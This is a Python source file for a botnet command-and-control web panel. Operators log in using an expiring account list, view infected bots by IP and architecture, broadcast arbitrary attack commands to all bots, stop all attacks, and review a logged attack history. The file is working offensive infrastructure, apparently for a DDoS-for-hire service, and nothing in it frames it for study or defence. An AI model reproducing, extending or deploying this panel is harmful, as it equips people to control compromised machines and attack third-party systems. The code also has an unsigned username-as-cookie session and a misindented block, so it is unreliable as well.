import json, os as _os, socketserver, threading, urllib.parse
from http.server import BaseHTTPRequestHandler
from datetime import datetime
from src.history import log_attack, get_history, is_admin_user, parse_login_line

try:
    with open(_os.path.join(_os.path.dirname(_os.path.abspath(__file__)), "config.json"), encoding="utf-8") as _f:
        _cfg = json.load(_f)
    _HOST = _cfg.get("cnc_host", "0.0.0.0")
    _PORT = int(_cfg.get("web_port", 5515))
except:
    _HOST, _PORT = "0.0.0.0", 5515

_WEB_DIR = _os.path.join(_os.path.dirname(_os.path.abspath(__file__)), "web")

bots = None
broadcast_func = None


def _load(name):
    try:
        with open(_os.path.join(_WEB_DIR, name), "rb") as f:
            return f.read()
    except:
        return None


    LOGIN_HTML = None
    LOGIN_CSS = None
    PANEL_HTML = None
    PANEL_CSS = None


def _reload():
    global LOGIN_HTML, LOGIN_CSS, PANEL_HTML, PANEL_CSS
    LOGIN_HTML = _load("login.html")
    LOGIN_CSS = _load("login.css")
    PANEL_HTML = _load("panel.html")
    PANEL_CSS = _load("panel.css")


_RELOAD_LOCK = threading.Lock()


class WebHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        path = urllib.parse.urlparse(self.path).path
        if path in ("/", "/login"):
            self.serve_login()
        elif path == "/login.css":
            self.serve_static("login.css", LOGIN_CSS, "text/css")
        elif path == "/panel.css":
            self.serve_static("panel.css", PANEL_CSS, "text/css")
        elif path == "/panel":
            self.serve_panel()
        elif path == "/bots":
            self.serve_panel()
        elif path == "/api/bots":
            self.serve_bots_json()
        elif path == "/api/history":
            self.serve_history_json()
        elif path == "/api/me":
            self.serve_me_json()
        elif path == "/logout":
            self.do_logout()
        else:
            self.send_error(404)
            self.end_headers()

    def do_POST(self):
        path = urllib.parse.urlparse(self.path).path
        if path == "/login":
            self.handle_login()
        elif path == "/command":
            self.handle_command()
        elif path == "/stop-all":
            self.handle_stop_all()
        else:
            self.send_error(404)
            self.end_headers()

    def get_user(self):
        c = self.headers.get("Cookie", "")
        for p in c.split(";"):
            p = p.strip()
            if p.startswith("webcnc="):
                return p[7:]
        return None

    def require(self):
        u = self.get_user()
        if not u:
            self.send_response(302)
            self.send_header("Location", "/")
            self.end_headers()
        return u

    def serve_static(self, name, data, mime):
        if data is None:
            self.send_error(404)
            self.end_headers()
            return
        self.send_response(200)
        self.send_header("Content-Type", mime)
        self.send_header("Cache-Control", "no-cache")
        self.end_headers()
        self.wfile.write(data)

    def serve_login(self):
        u = self.get_user()
        if u:
            self.send_response(302)
            self.send_header("Location", "/panel")
            self.end_headers()
            return
        if LOGIN_HTML:
            self.serve_static("login.html", LOGIN_HTML, "text/html")
        else:
            self.send_error(500)
            self.end_headers()

    def serve_panel(self):
        u = self.require()
        if not u:
            return
        if not PANEL_HTML:
            self.send_error(500)
            self.end_headers()
            return

        bc = str(len(bots) if bots else 0)
        rows = ""
        if bots:
            for bot, info in list(bots.items()):
                try:
                    addr = info[0]
                    if isinstance(addr, tuple):
                        addr = addr[0]
                    rows += "<tr><td>%s</td><td>%s</td><td>%s</td></tr>" % (
                        info[1], addr, info[2]
                    )
                except:
                    pass

        html = PANEL_HTML.decode().replace("{BOT_COUNT}", bc).replace("{BOT_ROWS}", rows)
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(html.encode())

    def serve_bots_json(self):
        u = self.require()
        if not u:
            return
        bl = []
        if bots:
            for bot, info in list(bots.items()):
                try:
                    addr = info[0]
                    if isinstance(addr, tuple):
                        addr = addr[0]
                    bl.append({"id": info[1], "ip": str(addr), "arch": info[2]})
                except:
                    pass
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps({"count": len(bl), "bots": bl}).encode())

    def serve_me_json(self):
        u = self.require()
        if not u:
            return
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps({"user": u, "admin": is_admin_user(u)}).encode())

    def serve_history_json(self):
        u = self.require()
        if not u:
            return
        admin = is_admin_user(u)
        rows = get_history(u if not admin else None, admin, 50)
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps({"history": rows}).encode())

    def handle_stop_all(self):
        u = self.require()
        if not u:
            return
        if broadcast_func:
            try:
                broadcast_func(".STOP-ALL")
                log_attack(u, ".STOP-ALL")
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps({"status": "ok", "message": "Stopping all attacks"}).encode())
            except Exception as e:
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps({"status": "error", "message": str(e)}).encode())
        else:
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"status": "error", "message": "Unavailable"}).encode())

    def do_logout(self):
        self.send_response(302)
        self.send_header("Set-Cookie", "webcnc=; Path=/; Max-Age=0")
        self.send_header("Location", "/")
        self.end_headers()

    def auth_user(self, username, password):
        try:
            logins = _os.path.join(
                _os.path.dirname(_os.path.abspath(__file__)), "logins.txt"
            )
            with open(logins) as f:
                for line in f:
                    uname, pwd, exp, _ = parse_login_line(line)
                    if uname and uname.lower() == username.lower() and pwd == password:
                        if exp:
                            try:
                                if datetime.now() > datetime.strptime(exp, "%Y-%m-%d"):
                                    return False
                            except:
                                pass
                        return True
        except:
            pass
        return False

    def handle_login(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode()
        params = urllib.parse.parse_qs(body)
        username = (params.get("u", [""])[0]).strip()
        password = (params.get("p", [""])[0]).strip()
        if username and password and self.auth_user(username, password):
            self.send_response(302)
            self.send_header("Set-Cookie", "webcnc=%s; Path=/; HttpOnly" % username)
            self.send_header("Location", "/panel")
            self.end_headers()
        else:
            if LOGIN_HTML:
                self.serve_static("login.html", LOGIN_HTML, "text/html")
            else:
                self.send_error(500)
                self.end_headers()

    def handle_command(self):
        u = self.require()
        if not u:
            return
        if not broadcast_func:
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"status": "error", "message": "Unavailable"}).encode())
            return
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode()
        params = urllib.parse.parse_qs(body)
        cmd = (params.get("c", [""])[0]).strip()
        if not cmd:
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"status": "error", "message": "No command"}).encode())
            return
        try:
            broadcast_func(cmd)
            log_attack(u, cmd)
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"status": "ok", "message": "Sent: " + cmd}).encode())
        except Exception as e:
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"status": "error", "message": str(e)}).encode())

    def log_message(self, format, *args):
        pass


class WebServer(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True


def start(host=_HOST, port=_PORT, bots_ref=None, broadcast_ref=None):
    global bots, broadcast_func
    bots = bots_ref
    broadcast_func = broadcast_ref
    _reload()

    server = WebServer((host, port), WebHandler)
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    return server, t


if __name__ == "__main__":
    _reload()
    s, _ = start()
    print("[Web-CNC] Listening on %s:%d" % (_HOST, _PORT))
    try:
        threading.Event().wait()
    except KeyboardInterrupt:
        s.shutdown()
